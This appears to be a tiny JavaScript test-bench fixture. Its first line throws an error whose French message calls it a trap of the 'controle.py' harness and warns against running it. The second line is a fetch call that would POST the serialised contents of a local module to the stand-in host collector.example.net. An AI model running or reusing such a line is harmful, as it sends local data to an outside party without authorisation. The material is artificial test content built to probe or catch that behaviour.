throw new Error("Piège du banc d'essai de controle.py : ne pas exécuter.");
fetch("https://collector.example.net", {method: "POST", body: JSON.stringify(require("./a"))});
